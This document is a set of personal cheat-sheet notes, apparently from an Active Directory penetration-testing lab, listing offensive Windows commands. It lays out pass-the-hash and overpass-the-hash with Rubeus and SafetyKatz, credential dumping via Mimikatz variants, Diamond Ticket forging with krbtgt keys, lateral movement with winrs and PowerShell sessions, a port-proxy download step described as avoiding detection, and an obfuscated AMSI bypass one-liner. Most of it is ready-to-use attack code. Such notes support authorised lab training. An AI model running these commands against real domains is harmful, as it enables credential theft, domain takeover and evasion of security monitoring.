### **WINRS**
```powershell
winrs -remote:server1 -u:server1\administrator - p:Pass@1234 hostname
```
```powershell
winrs -r:<MACCHINA> cmd
```
### **OVERPASS THE HASH**
```powershell
rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```
```cmd
Rubeus.exe asktgt /user:<USER> /aes256:<HASH> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Use winrs to test
```powershell
winrs -r:dcorp-dc whoami
```
*Using SafetyKatz*
```powershell
.\SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<HASH> /run:cmd.exe" "exit"
```
Run invishell and look for other system access
```powershell
Find-PSRemotingLocalAdminAccess -Verbose
```

### **Other Sessions Opened**
```powerview
Find-DomainUserLocation
```
![[Pasted image 20231018164427.png]]
Connect Using Win-rs
### **Copy from a machine to another**
```powershell
echo F | xcopy <PATH> \\<R MACHINE>\<R PATH>
```
```powershell
Copy-Item <PATH> \\<MACCHINA>\<R PATH>
```
### **Avoid detection while downloading**
```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<IP>"
```
Download and use program
```powershell
$null | winrs -r:<MACCHINA> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```
### **Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.**
Use Rubeus and the krbtgt credentials to create a Diamond Ticket
```CMD
C:\AD\Tools\Rubeus.exe diamond /krbkey:<krbtgt aes256> /tgtdeleg /enctype:aes /ticketuser:administrator /domain:<DOMAIN> /dc:<DC DOMAIN> /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
and now you can user win-rs to execute commands
### **PS-SESSION**
To persistence on dcorp-dc we can abuse the DSRM service.
Firtsly dump the hashes from the dc
Open a session on the dc
```powershell
. C:\AD\Tools\Invoke-Mimi.ps1
```
```powershell
Invoke-Mimi -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe"'
```
or using Rubeus
```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:<USER> /aes256:<AES256 HASH> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Launch Invishell e establish the session
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
```powershell
$sess = New-PSSession dcorp-dc
```
Bypass the AMSI
```powershell
Enter-PSSession -Session $sess
```
```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```